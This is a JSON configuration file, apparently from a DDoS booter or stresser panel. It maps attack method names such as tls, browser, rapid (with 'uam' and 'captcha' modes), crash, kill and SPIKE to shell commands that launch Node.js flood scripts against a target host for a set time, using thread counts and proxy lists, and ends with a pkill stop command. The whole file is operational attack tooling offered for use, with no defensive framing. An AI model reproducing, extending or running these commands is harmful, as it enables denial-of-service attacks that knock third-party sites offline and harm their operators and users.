[
    {
        "methods": "tls",
        "command": "cd /root/panas/ && [SCREEN_CMD] node TLS.js [HOST] [TIME] 500 10 proxy.txt"
    },
    {
        "methods": "browser",
        "command": "cd /root/panas/ && [SCREEN_CMD] node browser.js target time 500 25 proxy.txt`]"
    },
    {
        "methods": "mix",
        "command": "cd /root/panas/ && [SCREEN_CMD] node mix [HOST] [TIME] 500 20"
    },
    {
        "methods": "rapid",
        "command": "cd /root/panas/ && [SCREEN_CMD] node Rapid-Silit [HOST] [TIME] 10 proxy.txt 32 uam"
    },
    {
        "methods": "rapidv2",
        "command": "cd /root/panas/ && [SCREEN_CMD] node Rapid-Silit [HOST] [TIME] 10 proxy.txt 32 captcha"
    },
    {
        "methods": "crash",
        "command": "cd /root/panas/ && [SCREEN_CMD] node Crash-Silit [HOST] [TIME] 32 10 proxy.txt"
    },
    {
        "methods": "kill",
        "command": "cd /root/panas/ && [SCREEN_CMD] node KILL.js [HOST] [TIME] 500 25 proxy.txt"
    },
    {
        "methods": "SPIKE",
        "command": "cd /root/panas/ && [SCREEN_CMD] node SPIKE [HOST] 100 [TIME]"
    },
    {
        "methods": "stroke",
        "command": "cd /root/panas/ && [SCRREN_CMD] node STROKE [HOST] [TIME] 32 10 proxy.txt"
    },
    {
        "methods": "STOP",
        "command": "pkill -f [SCREEN_NAME]"
    }
]